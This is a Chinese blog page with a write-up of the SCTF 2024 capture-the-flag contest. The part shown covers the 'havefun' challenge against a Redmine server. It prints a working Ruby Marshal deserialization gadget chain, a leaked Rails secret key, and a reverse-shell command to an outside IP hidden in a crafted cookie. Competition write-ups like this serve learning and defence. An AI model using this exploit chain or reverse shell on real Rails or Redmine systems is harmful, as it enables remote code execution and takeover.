
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>SCTF 2024 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#havefun"><span class="toc-number">2.</span> <span class="toc-text">havefun</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#W-amp-M%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">W&amp;M的解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SycServer2-0%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">SycServer2.0（复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezRender%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">ezRender（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%EF%BC%9AWSGI%E5%B8%A6%E5%87%BA%E5%9B%9E%E6%98%BE"><span class="toc-number">4.1.</span> <span class="toc-text">预期：WSGI带出回显</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simpleshop%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">Simpleshop（复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjump%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">ezjump（复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-tex%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">ez_tex（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%831%EF%BC%9ACVE-2023-4911"><span class="toc-number">7.1.</span> <span class="toc-text">提权1：CVE-2023-4911</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%832%EF%BC%9Acapabilities%E6%8F%90%E6%9D%83"><span class="toc-number">7.2.</span> <span class="toc-text">提权2：capabilities提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E5%8D%B7"><span class="toc-number">8.</span> <span class="toc-text">问卷</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>SCTF 2024</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/9/28
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/ThinkPHP/" style="color: #00bcd4">ThinkPHP</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">10.6k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">58分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>并非不可战胜</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/82/">https://blog.wm-team.cn/index.php/archives/82/</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5OTUzNDY2Nw==&mid=2247484351&idx=1&sn=1a28c6baf473829b19bd2cc4992bd752&chksm=c1a154f6c9957c6f0ec29a9d139598afd6d56a31ae55c9d9deab543a8c810253586788cbb9e9&mpshare=1&scene=23&srcid=1001ghiPHORztFCWZYpppfOp&sharer_shareinfo=f76b8b69af4cfafe5da55fbff445acdc&sharer_shareinfo_first=f76b8b69af4cfafe5da55fbff445acdc#rd">https://mp.weixin.qq.com/s?__biz=Mzg5OTUzNDY2Nw==&amp;mid=2247484351&amp;idx=1&amp;sn=1a28c6baf473829b19bd2cc4992bd752&amp;chksm=c1a154f6c9957c6f0ec29a9d139598afd6d56a31ae55c9d9deab543a8c810253586788cbb9e9&amp;mpshare=1&amp;scene=23&amp;srcid=1001ghiPHORztFCWZYpppfOp&amp;sharer_shareinfo=f76b8b69af4cfafe5da55fbff445acdc&amp;sharer_shareinfo_first=f76b8b69af4cfafe5da55fbff445acdc#rd</a></p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@sahuang/H1A2qvIAR#SycServer20">https://hackmd.io/@sahuang/H1A2qvIAR#SycServer20</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qOueXdU3UaKiJoUnuUjBEA">https://mp.weixin.qq.com/s/qOueXdU3UaKiJoUnuUjBEA</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/">https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/</a></p>
<p><a target="_blank" rel="noopener" href="https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef?pvs=74">https://quick-mascara-699.notion.site/2024SCTF-wp-d34600322f1141e680e837abce5795ef?pvs=74</a></p>
<span id="more"></span>

<p><img src="/blog/2024/09/28/SCTF-2024/image-20241001193841563.png" alt="image-20241001193841563"></p>
<hr>
<h1 id="havefun"><a href="#havefun" class="headerlink" title="havefun"></a>havefun</h1><blockquote>
<p>apache最新最热</p>
</blockquote>
<blockquote>
<p>hint1：仔细思考SCTF.jpg的内容存在含义，本题不需要任何爆破扫描等操作<br>hint2：&#x2F;static&#x2F;test</p>
</blockquote>
<p><code>Please go to /static/SCTF.jpg</code></p>
<p>访问并下载SCTF.jpg</p>
<p>用010打开，在图片的末尾发现一段php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/etc/apache2/sites-available/000-default.conf'</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>dirsearch开扫，扫出个&#x2F;static&#x2F;test</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Database</span>
information_schema
mysql
performance_schema
redmine_default
secret
sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>是数据库名</p>
<p>发现里面的活动和文件都不用登录就可以访问	</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240928111431353.png" alt="image-20240928111431353"></p>
<p>公共靶机魅力时刻（</p>
<p>账密<code>admin:admin123456</code></p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">默认的管理员帐号已改变 	
附件路径可写 	
插件的附件路径可写 (./public/plugin_assets) 	
All database migrations have been run 	
MiniMagick 可用（可选的） 	
可使用 ImageMagick 转换图片格式 (可选) 	
ImageMagick PDF 支持 (可选)
Environment:
  Redmine version                5.0.4.stable
  Ruby version                   3.1.2-p20 (2022-04-12) [x86_64-linux-gnu]
  Rails version                  6.1.7.3
  Environment                    production
  Database adapter               Mysql2
  Mailer queue                   ActiveJob::QueueAdapters::AsyncAdapter
  Mailer delivery                smtp
Redmine settings:
  Redmine theme                  Default
SCM:
  Filesystem                     
Redmine plugins:
  no plugin installed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本地想起一个一样的环境，但是docker拉下来的环境路径不一样，不过文件结构差不多，测试发现上传的文件路径我们都不可控</p>
<p>apache2.4.55，结合配置服务的漏洞，想起来去年的 ezcheckin 也是个 apache 的洞</p>
<p>找了一圈，想起来black hat 2024的课题，参考：<a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig</a></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240928170847001.png" alt="image-20240928170847001"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240928162017844.png" alt="image-20240928162017844"></p>
<p>成功执行</p>
<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;VirtualHost *:80&gt;
# The ServerName directive sets the request scheme, hostname and port that
# the server uses to identify itself. This is used when creating
# redirection URLs. In the context of virtual hosts, the ServerName
# specifies what hostname must appear in the request&#39;s Host: header to
# match this virtual host. For the default virtual host (this file) this
# value is not decisive as it is used as a last resort host regardless.
# However, you must set it for any further virtual host explicitly.
#ServerName www.example.com

ServerAdmin webmaster@localhost
DocumentRoot &#x2F;var&#x2F;www&#x2F;html
PassengerAppRoot &#x2F;usr&#x2F;share&#x2F;redmine        

ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log
CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined
&lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;redmine&gt;
RailsBaseURI &#x2F;redmine
#PassengerResolveSymlinksInDocumentRoot on
&lt;&#x2F;Directory&gt;

# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the loglevel for particular
# modules, e.g.
#LogLevel info ssl:warn
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H&#x3D;application&#x2F;x-httpd-php] 	

LogLevel alert rewrite:trace3
RewriteEngine On
RewriteRule  ^&#x2F;profile&#x2F;(.*)$   &#x2F;$1.html

# For most configuration files from conf-available&#x2F;, which are
# enabled or disabled at a global level, it is possible to
# include a line for only one particular virtual host. For example the
# following line enables the CGI configuration for this host only
# after it has been globally disabled with &quot;a2disconf&quot;.
#Include conf-available&#x2F;serve-cgi-bin.conf
&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意这段</p>
<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">RewriteEngine On
RewriteRule  ^&#x2F;profile&#x2F;(.*)$   &#x2F;$1.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/09/28/SCTF-2024/image-20240928171757050.png" alt="image-20240928171757050"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240928171619157.png" alt="image-20240928171619157"></p>
<p>拿到私钥 <code>94e61cc23d1fa4e799f5bc6fd478fded</code></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240928181937710.png" alt="image-20240928181937710"></p>
<p>拿到数据库账密</p>
<p>试图打ruby cookie反序列化：<a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view">https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view</a></p>
<p>（有个有意思的事，在那篇 black hat 原文的繁中版那里可以找到这个打ror的链接，但是英文版的没有这个链接）</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'rails/all'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'cgi'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'active_support'</span></span>

Gem<span class="token double-colon punctuation">::</span>SpecFetcher
Gem<span class="token double-colon punctuation">::</span>Installer

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sprockets'</span></span>
<span class="token keyword">class</span> <span class="token class-name">Gem</span><span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader
<span class="token keyword">end</span>

d <span class="token operator">=</span> Rack<span class="token double-colon punctuation">::</span>Response<span class="token punctuation">.</span>allocate
d<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@buffered</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>

d0<span class="token operator">=</span>Rails<span class="token double-colon punctuation">::</span>Initializable<span class="token double-colon punctuation">::</span>Initializer<span class="token punctuation">.</span>allocate
d0<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@context</span><span class="token punctuation">,</span>Sprockets<span class="token double-colon punctuation">::</span>Context<span class="token punctuation">.</span>allocate<span class="token punctuation">)</span>

d1<span class="token operator">=</span>Gem<span class="token double-colon punctuation">::</span>Security<span class="token double-colon punctuation">::</span>Policy<span class="token punctuation">.</span>allocate
d1<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@name</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token symbol">:filename</span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"/tmp/pwn.txt"</span></span><span class="token punctuation">,</span> <span class="token symbol">:environment</span> <span class="token operator">=></span> d0  <span class="token punctuation">,</span> <span class="token symbol">:data</span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"&lt;%= `ls;bash -c 'bash -i >&amp; /dev/tcp/115.236.153.177/30908 0>&amp;1'` %>"</span></span><span class="token punctuation">,</span> <span class="token symbol">:metadata</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

d2<span class="token operator">=</span><span class="token class-name">Set</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">[</span>d1<span class="token punctuation">]</span><span class="token punctuation">)</span>

d<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@body</span><span class="token punctuation">,</span> d2<span class="token punctuation">)</span>
d<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@writer</span><span class="token punctuation">,</span> Sprockets<span class="token double-colon punctuation">::</span>ERBProcessor<span class="token punctuation">.</span>allocate<span class="token punctuation">)</span>

c<span class="token operator">=</span>Logger<span class="token punctuation">.</span>allocate
c<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@logdev</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>

e<span class="token operator">=</span>Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token double-colon punctuation">::</span>Entry<span class="token punctuation">.</span>allocate
e<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@read</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
e<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@header</span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"bbbb"</span></span><span class="token punctuation">)</span>

b<span class="token operator">=</span>Net<span class="token double-colon punctuation">::</span>BufferedIO<span class="token punctuation">.</span>allocate
b<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@io</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span>
b<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@debug_output</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>

<span class="token variable">$a</span><span class="token operator">=</span>Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token punctuation">.</span>allocate
<span class="token variable">$a</span><span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token operator">:</span><span class="token variable">@io</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span>

<span class="token keyword">module</span> <span class="token class-name">ActiveRecord</span>
    <span class="token keyword">module</span> <span class="token class-name">Associations</span>
        <span class="token keyword">class</span> <span class="token class-name">Association</span>
            <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">marshal_dump</span></span>
                <span class="token comment"># Gem::Installer instance is also set here</span>
                <span class="token comment"># because it autoloads Gem::Package which is</span>
                <span class="token comment"># required in rest of the chain</span>
                <span class="token punctuation">[</span>Gem<span class="token double-colon punctuation">::</span>Installer<span class="token punctuation">.</span>allocate<span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">]</span> 
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">sign_and_encrypt_data</span></span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> secret_key_base<span class="token punctuation">)</span>
    salt <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"authenticated encrypted cookie"</span></span>
    encrypted_cookie_cipher <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'aes-256-gcm'</span></span>
    serializer <span class="token operator">=</span> ActiveSupport<span class="token double-colon punctuation">::</span>MessageEncryptor<span class="token double-colon punctuation">::</span>NullSerializer

    key_generator <span class="token operator">=</span> ActiveSupport<span class="token double-colon punctuation">::</span><span class="token class-name">KeyGenerator</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>secret_key_base<span class="token punctuation">,</span> <span class="token symbol">iterations</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">)</span>
    key_len <span class="token operator">=</span> ActiveSupport<span class="token double-colon punctuation">::</span>MessageEncryptor<span class="token punctuation">.</span>key_len<span class="token punctuation">(</span>encrypted_cookie_cipher<span class="token punctuation">)</span>
    secret <span class="token operator">=</span> key_generator<span class="token punctuation">.</span>generate_key<span class="token punctuation">(</span>salt<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span>
    encryptor <span class="token operator">=</span> ActiveSupport<span class="token double-colon punctuation">::</span><span class="token class-name">MessageEncryptor</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> <span class="token symbol">cipher</span><span class="token operator">:</span> encrypted_cookie_cipher<span class="token punctuation">,</span> <span class="token symbol">serializer</span><span class="token operator">:</span> serializer<span class="token punctuation">)</span>
    data <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>encrypt_and_sign<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token constant">CGI</span><span class="token double-colon punctuation">::</span>escape<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">end</span>


final <span class="token operator">=</span> ActiveRecord<span class="token double-colon punctuation">::</span>Associations<span class="token double-colon punctuation">::</span>Association<span class="token punctuation">.</span>allocate
data <span class="token operator">=</span> Marshal<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>final<span class="token punctuation">)</span>
puts sign_and_encrypt_data<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"94e61cc23d1fa4e799f5bc6fd478fded"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/09/28/SCTF-2024/image-20240929015535883.png" alt="image-20240929015535883"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npoD73xm02DrbgVoluC24R%2Bigj6xXeLdDWK2w%2BNomugQDwfE4hWc2z3G7TQ4PbYEIkBhBCqubSdRCZnrOx2qG59Xr3Q8BM3pvQJ7gerDYnDtohS4wZA7CoWx2p15mFnOHlyf4fIp%2Bba9DPvOH22Fb9R0kEfQeq8EL2ig7lmY6GNWN2BWWlBE2U9EhYB0pIPhHPtz5Q7HEB2q4DVIz82wx3bp1%2Bd%2Bk7OuD3vPqZp6txJK3mmaCw9LI3tyxdgZwQfYpuZQwQPIL%2Bdf5fy9007YbUaJP5VZwOgx94JjBWCzVXtX%2F0erEKMLlFGzpklao38%2FCcji%2FMQoaD8uTsCdVtMIol6MA8foSd9s%2BYBmFrofEIWOCLRHy1ZZ%2FCmrXuo9hmCBTvmUnUrszjKqDiJ5p5%2BTBGE41JJMEzI67r4YGm5RcrPelEHMlNi7V1X3BGP4DOHRlGGe%2BQ4KquMJD1cUpk9GpcirQbFzCpYvx6k1XzTuKszPHOgTgJY%2FW6sT%2BJIlc2gx05BzbpgvCJLQteZPRbjAdTRjaAYr2p5Za2bErem0KW9%2FGQC6NSYF6tI9ehKl7RehDWoCypUtafylvXFPlKEPraWkqFtzCkW7y0O%2B59WLiEXwLKwtxWCb16YpyEDqzC39PaVhT%2BtrbUJYxndnTHhVMMDC49E4djT8I8X3huta13tlYXL8%2FLvaBVhEIgE40lQ8iHF1KPjJBhJo5c3kxnf7yddTV1OT2cnMer87lzf1f88%3D--uS48zvF1JZRGCyNn--sedX5HuohuWjGw1eKgPKYg%3D%3D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>&#x2F;login 处传cookie触发反序列化弹shell</p>
<p>打了一天这题看到网页的admin密码被改了，虽然用不到就是了（</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240929015105847.png" alt="image-20240929015105847"></p>
